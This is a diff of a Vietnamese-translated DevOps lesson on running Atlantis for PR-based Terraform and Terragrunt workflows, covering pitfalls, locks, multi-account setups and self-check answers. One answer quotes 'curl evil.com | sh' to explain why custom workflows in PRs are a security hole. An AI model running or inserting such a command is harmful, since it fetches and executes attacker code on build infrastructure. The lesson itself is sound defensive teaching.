 
-Within 1 min, Atlantis comments:
+Ít phút sau, Atlantis comment plan ngay trong PR:
+
 ```
 ran `plan` for project `dev-us-east-1-vpc`:
 
@@ -671,31 +713,30 @@ Plan: 1 to add, 0 to change, 0 to destroy.
 ...
 ```
 
-Review + approve PR. Comment `atlantis apply`:
+Review, approve PR, rồi comment `atlantis apply` để Atlantis thực thi:
+
 ```
 ran `apply` for project `dev-us-east-1-vpc`:
 
 Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
 ```
 
-Auto-merge PR (if `automerge: true` in atlantis.yaml).
-
-→ Full GitOps for infra.
+Nếu đặt `automerge: true` trong `atlantis.yaml`, PR sẽ tự merge sau apply. Tới đây bạn đã có một vòng GitOps hoàn chỉnh cho hạ tầng — mọi thay đổi đi qua PR, có review, có dấu vết.
 
 ---
 
-## 💡 Pitfall & Best practice
+## 💡 Cạm bẫy thường gặp & Best practice
 
-### ❌ Pitfall: Atlantis pod has AdministratorAccess
+### ❌ Cạm bẫy: Pod Atlantis mang AdministratorAccess
 
-→ Atlantis owns full AWS account. Compromise = full compromise.
+Khi pod Atlantis cầm `AdministratorAccess`, nó sở hữu toàn bộ tài khoản AWS. Một khi pod bị chiếm, cả tài khoản coi như thất thủ.
 
-→ **Fix**: 
-- Least privilege: IAM role with only necessary permissions per project.
-- Multi-account: separate Atlantis instance per env account.
-- Audit IAM regularly.
+→ **Fix**:
+- Least privilege: IAM role chỉ cấp đúng quyền cần thiết cho từng project.
+- Multi-account: tách một instance Atlantis riêng cho mỗi tài khoản môi trường.
+- Audit IAM định kỳ.
 
-### ❌ Pitfall: No PR approval gate for prod
+### ❌ Cạm bẫy: Không có cổng approval cho prod
 
 ```yaml
 projects:
@@ -703,70 +744,71 @@ projects:
     apply_requirements: []   # ← no requirement!
 ```
 
-→ Anyone can apply prod.
+Để `apply_requirements` rỗng nghĩa là ai cũng apply được prod — đúng cái mà GitOps sinh ra để ngăn.
 
-→ **Fix**: `apply_requirements: [approved]` + CODEOWNERS gate.
+→ **Fix**: `apply_requirements: [approved]` kết hợp cổng CODEOWNERS.
 
-### ❌ Pitfall: Atlantis bot account too permissive
+### ❌ Cạm bẫy: Tài khoản bot Atlantis quá nhiều quyền
 
-→ Bot account commits + reviews own PRs → bypass review.
-
-→ **Fix**:
-- Bot only **comments and applies**, not approves.
-- GitHub branch protection: require review by non-bot users.
-
-### ❌ Pitfall: Webhook secret leaked
-
-→ Anyone can spoof GitHub events.
-
-→ **Fix**: 
-- Rotate webhook secret quarterly.
-- Verify signature in Atlantis (default).
-- Don't commit `.env` with secrets.
-
-### ❌ Pitfall: Lock stuck after crash
-
-→ Atlantis crashed mid-apply. Lock stays. Future PRs blocked.
+Nếu bot vừa commit vừa được tự approve PR của chính nó, vòng review coi như bị vô hiệu.
 
 → **Fix**:
-- `atlantis unlock` from PR comment.
-- Or web UI `/locks`.
-- Atlantis health check + auto-restart.
+- Bot chỉ **comment và apply**, không được approve.
+- Branch protection: bắt buộc review bởi người không phải bot.
 
-### ❌ Pitfall: Atlantis Single replica = SPOF
+### ❌ Cạm bẫy: Webhook secret bị lộ
+
+Một khi webhook secret rò rỉ, kẻ xấu có thể giả mạo sự kiện GitHub bắn vào Atlantis.
+
+→ **Fix**:
+- Xoay (rotate) webhook secret định kỳ.
+- Bật xác thực chữ ký trong Atlantis (mặc định đã bật).
+- Đừng commit `.env` chứa secret.
+
+### ❌ Cạm bẫy: Lock kẹt sau khi crash
+
+Atlantis chết ngang lúc apply, lock không được nhả → mọi PR sau bị chặn.
+
+→ **Fix**:
+- `atlantis unlock` từ comment trong PR.
+- Hoặc vào web UI `/locks`.
+- Cấu hình health check + tự khởi động lại cho pod Atlantis.
+
+### ❌ Cạm bẫy: Single replica = điểm chết duy nhất (SPOF)
 
 ```yaml
 replicaCount: 1
 ```
 
-→ Pod restart = applies interrupted.
-
-→ **Fix**: 
-- Persist BoltDB on PVC (Atlantis state).
-- Restart should resume.
-- 2024+: Atlantis supports HA (multiple replicas with shared state in Redis).
-
-### ❌ Pitfall: Plan output too large for GitHub comment
-
-→ Plan with 500 resource changes = comment truncated.
+Chỉ một replica nghĩa là pod restart sẽ cắt ngang các lượt apply đang chạy.
 
 → **Fix**:
-- Use `atlantis plan -p <project>` for specific.
-- Split large changes into smaller PRs.
-- Atlantis output S3 link for huge plans.
+- Lưu BoltDB trên PVC (giữ trạng thái Atlantis).
+- Restart xong nên tự nối lại được.
+- Từ 2024, Atlantis hỗ trợ HA (nhiều replica chia sẻ state qua Redis).
 
-### ✅ Best practice: Pre-merge checks (CI)
+### ❌ Cạm bẫy: Plan quá dài, vượt giới hạn comment GitHub
 
-GitHub Actions in same PR:
+Một plan có 500 thay đổi resource sẽ bị GitHub cắt cụt comment, reviewer đọc thiếu.
+
+→ **Fix**:
+- Dùng `atlantis plan -p <project>` để plan riêng từng cái.
+- Chẻ thay đổi lớn thành nhiều PR nhỏ.
+- Cho Atlantis xuất link S3 cho các plan khổng lồ.
+
+### ✅ Best practice: Kiểm tra trước merge (CI)
+
+Hãy để GitHub Actions chạy các bước kiểm tra ngay trong cùng PR, trước khi tới Atlantis:
+
 - `terraform validate`
 - `tflint`
-- `tfsec` security scan
-- `checkov` policy scan
-- `infracost` cost estimate
+- `tfsec` (quét bảo mật)
+- `checkov` (quét policy)
+- `infracost` (ước tính chi phí)
 
-→ Plan/apply gated on multiple checks. Atlantis = final apply step.
+Như vậy plan/apply được gác bởi nhiều lớp kiểm tra, còn Atlantis chỉ là bước apply cuối cùng.
 
-### ✅ Best practice: Atlantis web UI restricted
+### ✅ Best practice: Siết quyền truy cập web UI Atlantis
 
 ```yaml
 ingress:
@@ -774,83 +816,83 @@ ingress:
     nginx.ingress.kubernetes.io/auth-url: "https://oauth2-proxy.acmeshop.vn/oauth2/auth"
 ```
 
-→ OAuth-protect UI. Internal access only.
+Bọc UI sau OAuth, chỉ cho truy cập nội bộ — đừng để trang `/locks` phơi ra Internet.
 
-### ✅ Best practice: Audit log to SIEM
+### ✅ Best practice: Đẩy audit log sang SIEM
 
-Atlantis emits structured logs. Ship to Loki/Splunk:
-- Who approved.
-- What applied.
-- Timestamp.
+Atlantis phát ra log có cấu trúc — hãy ship sang Loki/Splunk để giữ lại các thông tin kiểm toán:
 
-Retain 1+ year for compliance.
+- Ai đã approve.
+- Cái gì đã được apply.
+- Mốc thời gian.
 
-### ✅ Best practice: Drift detection cron
+Giữ tối thiểu một năm để phục vụ compliance.
 
-(Next lesson) Schedule daily `terragrunt plan` for all projects. Alert if diff.
+### ✅ Best practice: Cron phát hiện drift
+
+Lập một cron chạy `terragrunt plan` định kỳ cho mọi project và cảnh báo khi có sai khác — chủ đề này được đào sâu ở bài kế tiếp.
 
 ---
 
-## 🧠 Self-check
+## 🧠 Tự kiểm tra (Self-check)
 
-**Q1.** Vì sao Atlantis better than DIY GitHub Actions for IaC?
+Năm câu dưới chạm vào đúng những chỗ hay gây tranh cãi khi triển khai Atlantis. Bạn thử tự trả lời trước khi mở đáp án.
+
+**Q1.** Vì sao Atlantis hơn việc tự dựng GitHub Actions cho IaC?
 
 <details>
 <summary>💡 Đáp án</summary>
 
-**GitHub Actions for Terraform**:
-- Write `.github/workflows/terraform.yml`.
-- On PR: run `terraform plan`, post output as comment.
-- On merge: run `terraform apply`.
+Nếu tự dựng GitHub Actions cho Terraform, bạn thường viết một file `.github/workflows/terraform.yml`: khi mở PR thì chạy `terraform plan` và post output thành comment, khi merge thì chạy `terraform apply`.
 
-**Looks simple, but**:
-1. **State locking**: GitHub Actions doesn't manage cross-workflow lock. 2 PRs concurrent → race.
-2. **Plan persistence**: Plan from PR check doesn't persist to apply step. Re-plan at apply (state may have changed).
-3. **Targeted plan**: hard to detect "only VPC changed, only plan VPC".
-4. **Permissions**: GitHub Actions runs with `GITHUB_TOKEN` — can be tricky for cross-repo Terraform modules.
-5. **Apply trigger**: typically on merge. Can't `comment to apply` natively.
-6. **Lock UI**: no easy view of "what's locked, by whom".
-7. **Drift detection**: separate cron workflow needed.
+Nghe thì gọn, nhưng vướng một loạt vấn đề:
 
-**Atlantis**:
-- **Plan-apply consistency**: plan file persisted, apply uses same.
-- **Per-project lock**: BoltDB tracks per-folder.
-- **Smart change detection**: `when_modified` triggers per project.
-- **Comment to apply**: standard workflow.
-- **Lock UI**: web UI shows all locks.
-- **Built-in policies**: OPA, conftest support.
+1. **Khoá state**: GitHub Actions không quản lock xuyên các workflow. Hai PR chạy đồng thời → đua nhau (*race*).
+2. **Giữ plan**: plan từ bước kiểm tra ở PR không được giữ lại tới bước apply → phải plan lại lúc apply (mà lúc đó state có thể đã đổi).
+3. **Plan có chọn lọc**: khó tự nhận ra "chỉ VPC đổi, chỉ cần plan VPC".
+4. **Quyền**: GitHub Actions chạy với `GITHUB_TOKEN` — khá lằng nhằng với module Terraform nằm chéo nhiều repo.
+5. **Trigger apply**: thường gắn vào lúc merge, không có cơ chế "comment để apply" sẵn.
+6. **Xem lock**: không có chỗ nào dễ nhìn để biết "cái gì đang bị khoá, bởi ai".
+7. **Phát hiện drift**: phải dựng riêng một cron workflow.
 
-**Trade-off**: Atlantis = more setup (run service, webhook), better long-term for serious IaC.
+Đổi lại, Atlantis giải đúng từng điểm trên:
 
-**Hybrid**: GitHub Actions for fmt/lint/sec checks, Atlantis for plan/apply.
+- **Nhất quán plan–apply**: file plan được lưu lại, apply dùng đúng plan đó.
+- **Lock theo từng project**: BoltDB theo dõi từng thư mục.
+- **Phát hiện thay đổi thông minh**: `when_modified` kích hoạt theo từng project.
+- **Comment để apply**: là workflow chuẩn.
+- **Xem lock**: web UI liệt kê mọi lock.
+- **Policy tích hợp**: hỗ trợ OPA, conftest.
 
-**Recommend**:
-- < 5 modules + simple flow: GitHub Actions.
-- 10+ modules, multi-env, team: Atlantis (or Spacelift).
+**Đánh đổi**: Atlantis tốn công cài (chạy service, webhook), nhưng về lâu dài tốt hơn hẳn cho IaC nghiêm túc.
+
+**Lai (hybrid)**: GitHub Actions lo fmt/lint/sec check, Atlantis lo plan/apply.
+
+**Khuyến nghị**:
+- Dưới 5 module + flow đơn giản: GitHub Actions.
+- 10+ module, nhiều môi trường, làm team: Atlantis (hoặc Spacelift).
 </details>
 
-**Q2.** `atlantis.yaml` vs server-side workflow — which to use?
-
-<parameter name="content_continued">
+**Q2.** `atlantis.yaml` (repo-side) hay server-side workflow — nên dùng cái nào?
 
 <details>
 <summary>💡 Đáp án</summary>
 
-**Repo-side `atlantis.yaml`**:
-- Lives in repo (`atlantis.yaml`).
-- Per-repo customization.
-- Versioned with code.
-- Risk: malicious PR can modify `atlantis.yaml`.
+**`atlantis.yaml` phía repo**:
+- Nằm trong repo (`atlantis.yaml`).
+- Tuỳ biến theo từng repo.
+- Được version cùng code.
+- Rủi ro: một PR độc hại có thể sửa luôn `atlantis.yaml`.
 
-**Server-side workflows** (Atlantis config file):
-- Defined in Atlantis container.
-- Same for all repos.
-- Repos can only **reference**, not modify.
-- Safe — repos can't escalate.
+**Server-side workflow** (file config phía Atlantis):
+- Định nghĩa ngay trong container Atlantis.
+- Dùng chung cho mọi repo.
+- Repo chỉ được **tham chiếu**, không sửa được.
+- An toàn — repo không thể leo thang quyền.
 
-**Hybrid setup**:
+**Cấu hình lai**:
 
-`server-side-config.yaml` (Atlantis-side):
+Phía Atlantis (`server-side-config.yaml`):
 ```yaml
 repos:
   - id: github.com/acme/infrastructure
@@ -865,7 +907,7 @@ workflows:
     apply: { ... }
 ```
 
-Repo `atlantis.yaml`:
+Phía repo (`atlantis.yaml`):
 ```yaml
 projects:
   - name: dev-vpc
@@ -873,26 +915,26 @@ projects:
     workflow: terragrunt
 ```
 
-→ Repo controls **which folders**, server controls **how to run**.
+→ Repo quyết định **chạy ở thư mục nào**, server quyết định **chạy như thế nào**.
 
-**Recommended**:
-- Server-side: define safe workflows (terragrunt, terraform-prod with tfsec/policies).
-- Repo-side: project list, dir, allowed overrides.
-- `allow_custom_workflows: false` — prevent PR from defining new workflow.
+**Khuyến nghị**:
+- Server-side: định nghĩa các workflow an toàn (terragrunt, terraform-prod kèm tfsec/policy).
+- Repo-side: danh sách project, dir, các override được phép.
+- `allow_custom_workflows: false` — chặn PR tự định nghĩa workflow mới.
 
-**Anti-pattern**: `allow_custom_workflows: true` — any PR can define arbitrary workflow (e.g., `curl evil.com | sh`). Security hole.
+**Anti-pattern**: `allow_custom_workflows: true` — bất kỳ PR nào cũng định nghĩa được workflow tuỳ ý (ví dụ `curl evil.com | sh`). Đây là lỗ hổng bảo mật.
 
-→ Production: server-side workflows + restricted overrides.
+→ Production: dùng server-side workflow + giới hạn chặt các override.
 </details>
 
-**Q3.** Multi-account: Atlantis 1 instance vs N instances?
+**Q3.** Multi-account: nên dùng 1 instance Atlantis hay N instance?
 
 <details>
 <summary>💡 Đáp án</summary>
 
-**Option A: 1 Atlantis, AssumeRole to multiple accounts**:
+**Phương án A: 1 Atlantis, AssumeRole sang nhiều tài khoản**:
 
-Atlantis pod has IAM role in **management** account. Assumes role in dev/staging/prod accounts.
+Pod Atlantis giữ IAM role ở tài khoản **management**, rồi assume role sang các tài khoản dev/staging/prod.
 
 ```hcl
 # In terragrunt
@@ -903,75 +945,75 @@ provider "aws" {
 }
 ```
 
-**Pros**: 
-- Single Atlantis to maintain.
-- Cross-account state references easy (shared S3 bucket).
+**Ưu điểm**:
+- Chỉ một Atlantis để bảo trì.
+- Tham chiếu state chéo tài khoản dễ (chung một S3 bucket).
 
-**Cons**:
-- Blast radius: Atlantis compromise = full multi-account compromise.
-- Mixed concerns.
+**Nhược điểm**:
+- Bán kính thiệt hại (*blast radius*): Atlantis bị chiếm = cả multi-account thất thủ.
+- Trộn lẫn các mối quan tâm.
 
-**Option B: 1 Atlantis per env account**:
+**Phương án B: 1 Atlantis cho mỗi tài khoản môi trường**:
 
-Dev account has Atlantis-dev, prod has Atlantis-prod. Each only access its own account.
+Tài khoản dev có Atlantis-dev, prod có Atlantis-prod, mỗi cái chỉ chạm tài khoản của nó.
 
-**Pros**:
-- **Strong isolation**: dev mistake can't touch prod.
-- Production has stricter controls (no admin, slower change).
-- Different reviewers per env.
+**Ưu điểm**:
+- **Cô lập mạnh**: sai sót ở dev không thể chạm prod.
+- Production siết chặt hơn (không admin, đổi chậm rãi).
+- Reviewer khác nhau theo từng môi trường.
 
-**Cons**:
-- Manage 3 Atlantis instances.
-- Cross-env Terraform changes need 2 PRs (one per Atlantis).
+**Nhược điểm**:
+- Phải bảo trì 3 instance Atlantis.
+- Thay đổi Terraform xuyên môi trường cần 2 PR (mỗi Atlantis một cái).
 
-**Recommend 2026**:
-- **Multi-account production**: Option B. Worth the ops.
-- **Small startup**: Option A. Single Atlantis OK with strict IAM.
+**Khuyến nghị 2026**:
+- **Production nhiều tài khoản**: chọn phương án B. Đáng công vận hành.
+- **Startup nhỏ**: phương án A. Một Atlantis là ổn nếu IAM siết chặt.
 
-**Hybrid**: 1 Atlantis but **separate K8s cluster** per env. Same UX, different blast radius.
+**Lai**: vẫn 1 Atlantis nhưng **tách K8s cluster** theo môi trường. Trải nghiệm như nhau, blast radius khác hẳn.
 </details>
 
-**Q4.** Lock stuck — recovery procedure?
+**Q4.** Lock kẹt — quy trình khôi phục ra sao?
 
 <details>
 <summary>💡 Đáp án</summary>
 
-**Symptoms**:
-- PR shows `🔒 Locked by PR #123` for a project.
-- Comment `atlantis plan` → "still locked".
-- PR #123 closed/merged → lock not released.
+**Triệu chứng**:
+- PR hiện `🔒 Locked by PR #123` cho một project.
+- Comment `atlantis plan` → vẫn báo "still locked".
+- PR #123 đã đóng/merge nhưng lock chưa nhả.
 
-**Recovery steps**:
+**Các bước khôi phục**:
 
-**Step 1**: Try comment release:
+**Bước 1**: Thử nhả qua comment:
 ```
 # In any PR with same project
 atlantis unlock
 ```
 
-If works, done.
+Nếu được, xong.
 
-**Step 2**: Web UI:
-- Open `https://atlantis.acmeshop.vn/locks`.
-- Find project lock.
-- Click "Discard".
+**Bước 2**: Web UI:
+- Mở `https://atlantis.acmeshop.vn/locks`.
+- Tìm lock của project.
+- Bấm "Discard".
 
-**Step 3**: Atlantis pod restart:
+**Bước 3**: Khởi động lại pod Atlantis:
 ```bash
 kubectl rollout restart deployment/atlantis -n atlantis
 ```
 
-Locks should release on shutdown.
+Lock thường được nhả khi shutdown.
 
-**Step 4**: Wipe BoltDB:
+**Bước 4**: Xoá sạch BoltDB:
 ```bash
 kubectl exec -it atlantis-pod -- rm /atlantis-data/atlantis.db
 kubectl rollout restart deployment/atlantis -n atlantis
 ```
 
-⚠️ **Wipes all lock state** — only if nothing else locked legitimately.
+⚠️ **Xoá toàn bộ trạng thái lock** — chỉ làm khi chắc không còn lock hợp lệ nào khác.
 
-**Step 5**: DynamoDB lock (if Terraform-level stuck):
+**Bước 5**: Lock DynamoDB (nếu kẹt ở tầng Terraform):
 ```bash
 # Identify lock
 aws dynamodb scan --table-name tflocks-table
@@ -980,64 +1022,66 @@ aws dynamodb scan --table-name tflocks-table
 terragrunt force-unlock <lock-id>
 ```
 
-**Prevention**:
-- Atlantis pod healthcheck + auto-restart.
-- Webhook retry on Atlantis 5xx.
-- Monitor lock age — alert if > 24h.
+**Phòng ngừa**:
+- Pod Atlantis có healthcheck + tự restart.
+- Webhook retry khi Atlantis trả 5xx.
+- Theo dõi tuổi của lock — cảnh báo nếu quá 24h.
 
-**Audit**: lock stuck = bug in Atlantis or apply crashed. Investigate logs.
+**Audit**: lock kẹt nghĩa là có bug trong Atlantis hoặc apply đã crash. Phải lục log điều tra.
 </details>
 
-**Q5.** Drift between Terraform state and PR — what happens at apply?
+**Q5.** State bị drift so với plan trong PR — lúc apply thì sao?
 
 <details>
 <summary>💡 Đáp án</summary>
 
-**Scenario**:
-- PR opened at 10am, Atlantis plans: "add subnet, no other changes".
-- 11am: someone manually creates subnet in AWS Console (drift).
-- 12pm: PR approved, `atlantis apply`.
+**Kịch bản**:
+- PR mở lúc 10am, Atlantis plan: "thêm subnet, không có gì khác".
+- 11am: có người tạo tay subnet trong AWS Console (drift).
+- 12pm: PR được approve, gõ `atlantis apply`.
 
-**What Atlantis does**:
-- Re-plan? Or use saved plan?
+**Atlantis làm gì**:
+- Plan lại? Hay dùng plan đã lưu?
 
-**Default Atlantis** (v0.27.0+):
-- Uses **saved plan file** from earlier plan.
-- Apply executes that plan.
-- **Mismatches**: subnet that PR tries to create may already exist → apply fails.
+**Mặc định của Atlantis** (v0.27.0+):
+- Dùng **file plan đã lưu** từ lần plan trước.
+- Apply thực thi đúng plan đó.
+- **Lệch nhau**: subnet mà PR định tạo có thể đã tồn tại → apply thất bại.
 
-**Symptoms in apply output**:
+**Triệu chứng trong output apply**:
 ```
 Error: Error creating subnet:
   subnet "subnet-abc" already exists
 ```
 
-**Recovery**:
-1. Atlantis comment `atlantis plan` → re-plan with current state.
-2. New plan: notices subnet exists → no-op (or import).
-3. Apply new plan.
+**Khôi phục**:
+1. Comment `atlantis plan` → plan lại với state hiện tại.
+2. Plan mới: nhận ra subnet đã tồn tại → no-op (hoặc import).
+3. Apply plan mới.
 
-**Why save plan**:
-- **Apply ≠ re-plan**: ensures what reviewer saw == what applied. If state changes between plan and apply, reviewer didn't approve those changes.
-- Audit: "reviewer approved X, applied X" guarantee.
+**Vì sao lại lưu plan**:
+- **Apply ≠ plan lại**: đảm bảo cái reviewer thấy đúng bằng cái được apply. Nếu state đổi giữa plan và apply, reviewer chưa hề duyệt những thay đổi đó.
+- Audit: giữ vững cam kết "reviewer đã duyệt X, đã apply X".
 
-**Alternative: re-plan before apply**:
-- Configurable via Atlantis workflow.
-- More dynamic but breaks audit guarantee.
+**Phương án thay thế: plan lại ngay trước apply**:
+- Cấu hình được trong workflow Atlantis.
+- Linh hoạt hơn nhưng phá vỡ cam kết audit.
 
 **Best practice**:
-- Prevent drift via Atlantis enforcement (no manual changes).
-- Drift detection cron (next lesson) — alert if drift.
-- PR open → apply timing short (hours, not days).
+- Ngăn drift bằng kỷ luật Atlantis (cấm sửa tay).
+- Cron phát hiện drift (bài kế tiếp) — cảnh báo khi có sai khác.
+- Giữ khoảng cách giữa lúc mở PR và lúc apply càng ngắn càng tốt.
 
-**If apply fails due to drift**: Atlantis comments error. Dev re-plans, reviews diff, re-applies.
+**Nếu apply thất bại do drift**: Atlantis comment lỗi, dev plan lại, soi diff, rồi apply lại.
 
-→ Drift handling is process discipline + tooling.
+→ Xử lý drift là chuyện kỷ luật quy trình cộng với công cụ.
 </details>
 
 ---
 
-## ⚡ Cheatsheet
+## ⚡ Tra cứu nhanh (Cheatsheet)
+
+Gom các lệnh hay dùng theo nhóm: cài bằng Helm, CLI cục bộ, comment trong PR, web UI; rồi tới các mẫu `atlantis.yaml` và config server-side.
 
 ```bash
 # === Helm install ===
@@ -1098,57 +1142,60 @@ workflows:
 
 ---
 
-## 📚 Glossary
+## 📚 Từ Điển Thuật Ngữ (Glossary)
 
-| Term | Vietnamese / Explanation |
-|---|---|
-| **Atlantis** | Self-hosted PR-based Terraform/Terragrunt workflow |
-| **GitOps for IaC** | Git = source of truth, PR triggers apply |
-| **Webhook** | GitHub HTTP callback on PR events |
-| **`atlantis.yaml`** | Repo config file for Atlantis |
-| **Server-side config** | Atlantis-side workflow definitions (safe) |
-| **Repo-side config** | Per-repo overrides (`atlantis.yaml`) |
-| **`apply_requirements`** | Conditions before apply (approved, mergeable) |
-| **`autoplan`** | Atlantis auto-runs plan on PR open / push |
-| **`when_modified`** | File patterns triggering autoplan |
-| **Project** | A Terraform/Terragrunt folder Atlantis tracks |
-| **Workflow** | Custom plan/apply steps definition |
-| **Lock** | Atlantis per-project mutex (BoltDB/Redis) |
-| **IRSA** | IAM Roles for Service Accounts (AWS pod identity) |
-| **Spacelift / env0** | Commercial Atlantis alternatives (SaaS) |
-| **Terraform Cloud** | HashiCorp managed Terraform SaaS |
-| **terragrunt-atlantis-config** | Tool generating atlantis.yaml from Terragrunt repo |
-| **conftest** | Tool running OPA policies on Terraform JSON |
-| **PR-based workflow** | Changes via PR, never direct |
+| Thuật ngữ | Tiếng Việt | Giải thích |
+|---|---|---|
+| **Atlantis** | Server GitOps tự host | Workflow Terraform/Terragrunt dựa trên PR, tự host |
+| **GitOps for IaC** | GitOps cho hạ tầng | Git là nguồn sự thật, PR kích hoạt apply |
+| **Webhook** | Lời gọi callback | HTTP callback của GitHub khi có sự kiện PR |
+| **`atlantis.yaml`** | Config phía repo | File cấu hình Atlantis đặt trong repo |
+| **Server-side config** | Config phía server | Định nghĩa workflow phía Atlantis (an toàn) |
+| **Repo-side config** | Config phía repo | Override theo từng repo (`atlantis.yaml`) |
+| **`apply_requirements`** | Điều kiện apply | Các điều kiện trước khi apply (approved, mergeable) |
+| **`autoplan`** | Tự động plan | Atlantis tự chạy plan khi mở PR / push |
+| **`when_modified`** | Mẫu kích hoạt | Mẫu file kích hoạt autoplan |
+| **Project** | Project | Một thư mục Terraform/Terragrunt Atlantis theo dõi |
+| **Workflow** | Quy trình | Định nghĩa các bước plan/apply tuỳ biến |
+| **Lock** | Khoá | Mutex cấp project của Atlantis (BoltDB/Redis) |
+| **IRSA** | IAM role cho pod | IAM Roles for Service Accounts (danh tính pod trên AWS) |
+| **Spacelift / env0** | Đối thủ thương mại | Lựa chọn thay Atlantis dạng SaaS |
+| **Terraform Cloud** | Terraform SaaS | Dịch vụ Terraform có quản lý của HashiCorp |
+| **terragrunt-atlantis-config** | Tool sinh config | Tool sinh atlantis.yaml từ repo Terragrunt |
+| **conftest** | Tool kiểm policy | Chạy policy OPA trên JSON của Terraform |
+| **PR-based workflow** | Quy trình qua PR | Mọi thay đổi đi qua PR, không trực tiếp |
 
 ---
 
 ## 🔗 Liên kết & Tài nguyên
 
-### Trong cluster
-- ↶ Trước: [01_terragrunt-dry-multi-env.md](01_terragrunt-dry-multi-env.md)
-- → Tiếp: [03_state-advanced-and-drift.md](03_state-advanced-and-drift.md) *(sắp viết)*
-- ↑ Cluster: [IaC README](../../README.md)
+### 🧭 Định hướng lộ trình học
 
-### Cross-reference
-- 🔁 [CI/CD intermediate GitOps ArgoCD](../../../ci-cd/lessons/02_intermediate/01_gitops-with-argocd.md) — same concept for apps
-- 🔁 [CI/CD intermediate Secret mgmt](../../../ci-cd/lessons/02_intermediate/03_secret-management.md) — Vault for Atlantis credentials
-- ☸️ [K8s intermediate](../../../kubernetes/lessons/02_intermediate/) — deploy Atlantis on K8s
+- ⬅️ **Bài trước:** [Terragrunt — DRY Terraform cho multi-env multi-region](01_terragrunt-dry-multi-env.md)
+- ➡️ **Bài tiếp theo:** [State management nâng cao + Drift detection — Cứu hạ tầng khỏi 200 resource bị xoá nhầm](03_state-advanced-and-drift.md)
+- ↑ **Về cụm:** [IaC — Infrastructure as Code](../../README.md)
 
-### Tài nguyên ngoài
+### 🧩 Các chủ đề có thể bạn quan tâm
+
+- 🔁 [GitOps với ArgoCD — Git = Single Source of Truth](../../../ci-cd/lessons/02_intermediate/01_gitops-with-argocd.md) — cùng ý tưởng GitOps nhưng cho ứng dụng
+- 🔁 [Secret management — Vault + External Secrets Operator + 12-factor](../../../ci-cd/lessons/02_intermediate/03_secret-management.md) — Vault để quản lý credentials cho Atlantis
+- ↑ **Về cụm:** [Kubernetes — Intermediate cluster](../../../kubernetes/lessons/02_intermediate/README.md) — nơi deploy Atlantis
+
+### 🌐 Tài nguyên tham khảo khác
+
 - 📖 [Atlantis docs](https://www.runatlantis.io/)
 - 📖 [Atlantis Helm chart](https://github.com/runatlantis/helm-charts)
 - 📖 [terragrunt-atlantis-config](https://github.com/transcend-io/terragrunt-atlantis-config)
-- 📖 [Spacelift](https://spacelift.io/) — commercial alternative
-- 📖 [env0](https://www.env0.com/) — commercial alternative
+- 📖 [Spacelift](https://spacelift.io/) — đối thủ thương mại
+- 📖 [env0](https://www.env0.com/) — đối thủ thương mại
 - 📖 [Terraform Cloud](https://www.hashicorp.com/products/terraform)
-- 📖 [Conftest](https://www.conftest.dev/) — OPA policies for IaC
-- 📖 [Atlantis-Demo](https://github.com/runatlantis/atlantis-tutorial) — official tutorial
+- 📖 [Conftest](https://www.conftest.dev/) — policy OPA cho IaC
+- 📖 [Atlantis tutorial](https://github.com/runatlantis/atlantis-tutorial) — hướng dẫn chính thức
 
 ---
 
-## 📌 Changelog
+## 📌 Nhật ký thay đổi (Changelog)
 
-- **v1.1.0 (25/05/2026)** — Apply Blueprint v0.5.4+ §3.6: thêm lead-in trước Architecture + Pre-requisites + Helm install + Plan comment + Available commands.
-
-- **v1.0.0 (24/05/2026)** — Bản đầu tiên. Lesson 02 intermediate. Atlantis architecture + Helm install + GitHub webhook + atlantis.yaml + workflow + apply_requirements + RBAC + state lock + Terragrunt integration + comparison with Spacelift/env0/Terraform Cloud + hands-on. Apply insight `__Ref__/` (GitOps as enforcement gate). 8 pitfall + 4 best practice + 5 self-check + cheatsheet.
+- **v1.0.0 (24/05/2026)** — Bản đầu tiên. Lesson 02 intermediate. Atlantis architecture + Helm install + GitHub webhook + atlantis.yaml + workflow + apply_requirements + RBAC + state lock + Terragrunt integration + comparison với Spacelift/env0/Terraform Cloud + hands-on. 8 pitfall + 4 best practice + 5 self-check + cheatsheet.
+- **v1.1.0 (25/05/2026)** — Thêm lead-in trước Architecture + Pre-requisites + Helm install + Plan comment + Available commands.
+- **v2.0.0 (07/06/2026)** — Viết lại toàn bộ prose sang tiếng Việt narrative theo gold-standard: Việt hoá tình huống mở bài, thêm lời dẫn trước mỗi code/bảng/list và câu phân tích sau, làm mượt các đoạn "điện tín" EN ở §1–§9, dịch toàn bộ block Components/Why GitOps/RBAC/lock/so sánh và 5 self-check; chuẩn hoá heading framework canonical (Self-check / Cheatsheet / Cạm bẫy thường gặp & Best practice / Glossary / Liên kết & Tài nguyên + 3 sub); metadata "Yêu cầu trước" + link tiêu đề thực; Glossary 3 cột; nav marker ⬅️/➡️/↑ + link-text = tiêu đề H1 thực, gỡ nhãn "(sắp viết)" cho bài 03 đã tồn tại; "Pros/Cons" → "Ưu điểm/Nhược điểm". Giữ nguyên 100% code/config/số liệu/diagram/tên công cụ EN.
